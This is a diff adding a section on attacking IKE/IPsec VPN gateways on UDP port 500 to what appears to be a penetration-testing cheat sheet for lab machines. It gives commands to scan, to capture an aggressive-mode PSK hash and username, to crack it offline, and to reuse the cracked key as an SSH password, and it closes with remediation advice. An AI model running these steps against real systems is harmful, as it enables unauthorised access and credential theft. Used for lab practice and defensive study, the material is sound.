@@ -204,6 +204,37 @@ snmpwalk -v 2c -c public $IP 1.3.6.1.2.1.6.13.1.3    # open TCP ports
 
 ---
 
+## 500 — IKE / IPsec (UDP)
+
+```bash
+# ALWAYS scan UDP when TCP looks barren — a box that is "only SSH" often has its
+# foothold here. 500/udp open = IPsec VPN gateway.
+nmap -sU --top-ports 100 $IP            # find it
+ike-scan -M $IP                         # fingerprint: transform set + VIDs (XAUTH/DPD)
+
+# The win: IKEv1 AGGRESSIVE mode leaks identity + a crackable PSK hash, unauthenticated.
+ike-scan -A -M $IP                       # does it answer in aggressive mode?
+ike-scan -A --pskcrack=psk.txt $IP       # capture PSK material to a file
+# Two facts fall out of the aggressive reply:
+#   ID(Type=ID_USER_FQDN, Value=user@domain.htb)  -> a USERNAME + domain
+#   Hash(20 bytes)                                -> a PSK-derived SHA1, crackable offline
+
+# Crack the PSK offline (psk-crack ships with ike-scan, NOT hashcat/john):
+psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt
+
+# Then TEST THE PSK AS A LOGIN PASSWORD (credential reuse) before anything else —
+# the cracked PSK is frequently reused as the leaked user's SSH password.
+ssh user@$IP        # password = cracked PSK
+```
+
+> **Why aggressive mode is the bug:** Main Mode sends identity + auth hash *after* DH
+> encryption; Aggressive Mode sends them in the clear in the first exchange, so any
+> unauthenticated peer who initiates the handshake walks away with a username and an
+> offline-crackable PSK. Remediation: disable aggressive mode / move to IKEv2, use a
+> strong unique PSK, and don't put a real username in the ID payload.
+
+---
+
 ## 389 / 636 — LDAP
 
 ```bash
